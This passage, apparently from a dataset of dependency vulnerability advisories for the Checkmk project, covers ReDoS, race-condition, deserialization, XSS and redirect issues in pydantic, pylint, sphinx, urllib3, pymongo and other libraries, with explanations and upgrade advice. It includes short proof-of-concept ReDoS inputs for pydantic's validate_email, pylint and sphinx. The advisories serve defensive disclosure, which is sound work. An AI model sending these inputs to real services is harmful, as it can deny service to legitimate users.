Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7360/commits/64cd8266602f5ffa898f938681be3626df345384)
- [GitHub Commit](https://github.com/pydantic/pydantic/pull/7673/commits/3cc150ecbf86ac3509e1ca2904bf2c256c3fb558)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7673)
",3,2
Checkmk_checkmk,pydantic,,True,,CWE-1333,2023-09-20,"## Overview
[pydantic](https://pypi.org/project/pydantic) is a Data validation and settings management using python 3.6 type hinting

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the `networks.py` file.
## PoC
```py

import time
from pydantic import networks
from pydantic.networks import validate_email

start = time.time()

try:
    exploit_string = '<' + ' ' * 3000
    validate_email(exploit_string)
except:
    pass

print(f""Time elapsed: {time.time() - start}"")

```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pydantic` to version 1.10.13, 2.4.0 or higher.
## References
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/59d8f38fd6220e3917c53785dbc70317d6f8e631)
- [GitHub Commit](https://github.com/pydantic/pydantic/commit/e4393ae6145c4dadff739990bb0116c6dec3441b)
- [GitHub PR](https://github.com/pydantic/pydantic/pull/7360)
",3,2
Checkmk_checkmk,pydantic,,True,CVE-2024-3772,CWE-1333,2024-04-15,"Pydantic是Pydantic开源的一个库。可以使用 Python 类型提示进行数据验证。
Pydantic 2.4.0之前、1.10.13之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过精心设计的电子邮件字符串造成拒绝服务。",3,0
Checkmk_checkmk,urllib3,2.3.0 \,True,CVE-2025-50182,CWE-601,2025-06-19,<p>urllib3 是一个用于在 Python 中执行 HTTP 请求的流行库，并在 Pyodide 运行时中支持使用 JavaScript Fetch API 或回退使用 XMLHttpRequest。这意味着可以从浏览器或 Node.js 中使用 Python 库进行 HTTP 请求控制。然而，在 Pyodide 中，这些请求的重定向行为因 `retries` 和 `redirect` 参数被忽略而受到影响，由运行时自行决定重定向行为。</p>,3,2
Checkmk_checkmk,urllib3,2.3.0 \,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
Checkmk_checkmk,urllib3,2.3.0 \,True,CVE-2025-50182,CWE-601,2025-06-19,<p>urllib3 是一个用于在 Python 中执行 HTTP 请求的流行库，并在 Pyodide 运行时中支持使用 JavaScript Fetch API 或回退使用 XMLHttpRequest。这意味着可以从浏览器或 Node.js 中使用 Python 库进行 HTTP 请求控制。然而，在 Pyodide 中，这些请求的重定向行为因 `retries` 和 `redirect` 参数被忽略而受到影响，由运行时自行决定重定向行为。</p>,3,2
Checkmk_checkmk,urllib3,2.3.0 \,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
Checkmk_checkmk,hypothesis,#usedbyunittests,True,,CWE-362,2023-08-22,"## Overview
[hypothesis](https://pypi.org/project/hypothesis) is an A library for property-based testing

Affected versions of this package are vulnerable to Race Condition when multiple tests share the same `RecursiveStrategy` instance and are executed in multiple threads.
## Remediation
Upgrade `hypothesis` to version 6.0.4 or higher.
## References
- [GitHub Commit](https://github.com/HypothesisWorks/hypothesis/commit/218dd5db4d46759313f7071ad1822a4f075bb2c0)
- [GitHub Issue](https://github.com/HypothesisWorks/hypothesis/issues/2717)
- [GitHub PR](https://github.com/HypothesisWorks/hypothesis/pull/2783)
",3,2
Checkmk_checkmk,matplotlib,#usedbyperformancetestplotting,True,CVE-2013-1424,CWE-120,2025-06-26,matplotlib 是一个用于生成图形和可视化的 Python 库，广泛应用于数据分析和科学计算领域。此组件提供了丰富的绘图功能，使用者可以创建各类复杂图表和图形。缓冲区溢出漏洞通常是由于程序未能正确限制输入的数据长度，导致攻击者发送过多数据，覆盖内存中的其他区域，从而可能执行任意代码。在这种情况下，matplotlib 在版本更新之前的某些操作中，由于缓冲区处理不当，可能引发缓冲区溢出。,3,0
Checkmk_checkmk,networkx,#neededforpy-import-cycles,True,,CWE-502,2021-03-22,"## Overview
[networkx](https://pypi.org/project/networkx/) is a Python package for creating and manipulating graphs and networks

Affected versions of this package are vulnerable to Deserialization of Untrusted Data. This package is vulnerable to arbitrary code execution via insecure YAML deserialization due to the use of a known vulnerable function `load()` in yaml, which is called in `read_yaml()` in `networkx/readwrite/nx_yaml.py`.

`networkx/readwrite/nx_yaml.py` is deprecated and scheduled to be removed in the next release of Networkx. Users should avoid using this function completely.

## Details

Serialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.

_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.

Java deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.

  
An attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.
  

> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).

- Apache Blog
  
## Remediation
Upgrade `networkx` to version 2.6 or higher.
## References
- [GitHub PR](https://github.com/networkx/networkx/pull/4541)
",2,0
Checkmk_checkmk,pylint,#usedbytest/Makefile'stest-pylinttarget,True,,CWE-400,2021-03-30,"## Overview
[pylint](https://github.com/PyCQA/pylint) is a Python static code analysis tool which looks for programming errors, helps enforcing a coding standard, sniffs for code smells and offers simple refactoring suggestions.

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) via the `SPECIAL` and `PRIVATE` attributes in `pylint/pylint/pyreverse/utils.py`. The ReDoS is mainly due to the pattern `[^\W_]+\w*`, and can be exploited with an input string such as `""__""+""1""*5000 + ""!""`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pylint` to version 2.7.0 or higher.
## References
- [GitHub Commit](https://github.com/PyCQA/pylint/commit/5405dd5115d598fa69e49538d50ec79202b1b52e)
- [GitHub Issue](https://github.com/PyCQA/pylint/issues/3811)
- [GitHub Release](https://github.com/PyCQA/pylint/releases/tag/pylint-2.7.0)
",3,2
Checkmk_checkmk,pylint,#usedbytest/Makefile'stest-pylinttarget,True,,CWE-400,2020-09-11,"## Overview
[pylint](https://github.com/PyCQA/pylint) is a Python static code analysis tool which looks for programming errors, helps enforcing a coding standard, sniffs for code smells and offers simple refactoring suggestions.

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). A regular expression denial of service issue exists in `pyreverse`. The ambiguities of vulnerable regular expressions are removed, making the repaired regular expressions safer and faster matching.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `pylint` to version 2.6.1 or higher.
## References
- [GitHub Commit](https://github.com/PyCQA/pylint/commit/5405dd5115d598fa69e49538d50ec79202b1b52e)
- [GitHub Issue](https://github.com/PyCQA/pylint/issues/3811)
- [GitHub PR 1](https://github.com/PyCQA/pylint/pull/3816)
- [GitHub PR 2](https://github.com/PyCQA/pylint/pull/3828)
",2,0
Checkmk_checkmk,pymongo,#usedbymk_mongodbagentplugin,True,,CWE-125,2024-05-31,,3,1
Checkmk_checkmk,pymongo,#usedbymk_mongodbagentplugin,True,CVE-2024-5629,CWE-125,2024-05-31,"PyMongo是MongoDB开源的一个官方 MongoDB Python 驱动程序。
PyMongo 4.6.2 版本及之前版本存在安全漏洞，该漏洞源于 bson 模块存在越界读取问题。",3,0
Checkmk_checkmk,pymongo,#usedbymk_mongodbagentplugin,True,CVE-2013-2132,CWE-400,2013-05-31,"MongoDB是美国MongoDB公司的一种面向文档的数据库管理系统。
MongoDB的mongo-python-driver2.5.2之前版本存在安全漏洞。攻击者利用该漏洞导致系统拒绝服务（空指针逆向引用造成程序崩溃）。",3,0
Checkmk_checkmk,pymongo,#usedbymk_mongodbagentplugin,True,CVE-2024-21506,CWE-125,2024-04-05,bson模块是一个用于处理 BSON 数据格式的库，BSON 是一种用于存储和网络传输的二进制编码的 JSON 格式。当精心构造的载荷强制解析器反序列化非托管内存时，会导致越界读取漏洞。解析器试图解释缓冲区旁边的字节，并抛出带有字符串的异常。如果下一个字节不是可打印的 UTF-8，解析器会抛出带有单个字节的异常。,2,2
Checkmk_checkmk,pytest-xdist,#usedtolimitnumberofprocsine2etests,True,,CWE-362,2023-12-06,"## Overview
[pytest-xdist](https://pypi.org/project/pytest-xdist) is a pytest xdist plugin for distributed testing, most importantly across multiple CPUs

Affected versions of this package are vulnerable to Race Condition in the `looponfail` mode where a concurrent file removal could cause a crash.
## Remediation
Upgrade `pytest-xdist` to version 1.6 or higher.
## References
- [GitHub Commit](https://github.com/pytest-dev/pytest-xdist/commit/d9c5f18478db6d1d1584f53ce1b4c1c4feb43f9a)
",3,0
Checkmk_checkmk,sphinx,#usedforthepluginAPIdocumentation,True,CVE-2020-11022,CWE-79,2020-04-29,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.2版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
Checkmk_checkmk,sphinx,#usedforthepluginAPIdocumentation,True,CVE-2020-11023,CWE-79,2020-04-13,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.0.3版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
Checkmk_checkmk,sphinx,#usedforthepluginAPIdocumentation,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the function `load_v2` of `inventory.py`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f7b872e673f9b359a61fd287a7338a28077840d2)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8175)
",3,2
Checkmk_checkmk,sphinx,#usedforthepluginAPIdocumentation,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in google style docs, due to using an inefficient regex pattern with quantified overlapping adjacency.
## PoC
```
"" "" * 5000 + ""!""
```

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

Let's look at how our expression runs into this problem, using a shorter string: ""ACCCX"". While it seems fairly straightforward, there are still four different ways that the engine could match those three C's:
1. CCC
2. CC+C
3. C+CC
4. C+C+C.

The engine has to try each of those combinations to see if any of them potentially match against the expression. When you combine that with the other steps the engine must take, we can use [RegEx 101 debugger](https://regex101.com/debugger) to see the engine has to take a total of 38 steps before it can determine the string doesn't match.

From there, the number of steps the engine must use to validate a string just continues to grow.

| String | Number of C's | Number of steps |
| -------|-------------:| -----:|
| ACCCX | 3 | 38
| ACCCCX | 4 | 71
| ACCCCCX | 5 | 136
| ACCCCCCCCCCCCCCX | 14 | 65,553


By the time the string includes 14 C's, the engine has to take over 65,000 steps just to see if the string is valid. These extreme situations can cause them to work very slowly (exponentially related to input size, as shown above), allowing an attacker to exploit this and can cause the service to excessively consume CPU, resulting in a Denial of Service.

## Remediation
Upgrade `sphinx` to version 3.3.0 or higher.
## References
- [GitHub Commit](https://github.com/sphinx-doc/sphinx/commit/f00e75278c5999f40b214d8934357fbf0e705417)
- [GitHub Issue](https://github.com/sphinx-doc/sphinx/issues/8172)
- [Vulnerable Code](https://github.com/sphinx-doc/sphinx/blob/31f26a0bbf5e4e53b340e10464fc7c4cca96f12a/sphinx/ext/napoleon/docstring.py#L34)
",3,2
Checkmk_checkmk,svglib,#licensecsvpdfgenerating,True,CVE-2020-10799,CWE-611,2020-03-20,"svglib package for Python是一款基于Python的用于读取和转换SVG文件的Python库。
svglib package 0.9.3及之前版本（Python）中存在代码问题漏洞。攻击者可通过调用‘svg2rlg’函数利用该漏洞获取敏感信息。",1,2
Checkmk_checkmk,twine,#usedtouploadpackagestointernalPyPimirror,True,,CWE-601,2015-01-30,"## Overview
[`twine`](https://pypi.python.org/pypi/twine) is a Collection of utilities for interacting with PyPI.

Affected versions of this package are vulnerable to Open Redirection when uploading a library to pypi.

## References
- [GitHub Issue](https://github.com/pypa/twine/issues/92)
- [GitHub PR](https://github.com/pypa/twine/pull/94)
- [GitHub Commit](https://github.com/pypa/twine/commit/29e85757559154e919c9fe0a7f5803a425628855)
",3,0
Checkmk_checkmk,semgrep,,True,,CWE-1333,2023-09-10,"## Overview
[semgrep](https://pypi.org/project/semgrep) is a Lightweight static analysis for many languages. Find bug variants with patterns that look like source code.

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of insecure regular expressions in `POSSIBLE_REGEXES `.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

The expression would match inputs such as `ABBD`, `ABCCCCD`, `ABCBCCCD` and `ACCCCCD`

It most cases, it doesn't take very long for a regex engine to find a match:

```bash
$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCD"")'
0.04s user 0.01s system 95% cpu 0.052 total

$ time node -e '/A(B|C+)+D/.test(""ACCCCCCCCCCCCCCCCCCCCCCCCCCCCX"")'
1.79s user 0.02s system 99% cpu 1.812 total
```

The entire process of testing it against a 30 characters long string takes around ~52ms. But when given an invalid string, it takes nearly two seconds to complete the test, over ten times as long as it took to test a valid string. The dramatic difference is due to the way regular expressions get evaluated.

Most Regex engines will work very similarly (with minor differences). The engine will match the first possible way to accept the current character and proceed to the next one. If it then fails to match the next one, it will backtrack and see if there was another way to digest the previous character. If it goes too far down the rabbit hole only to find out the string doesn’t match in the end, and if many characters have multiple valid regex paths, the number of backtracking steps can become very large, resulting in what is known as _catastrophic backtracking_.

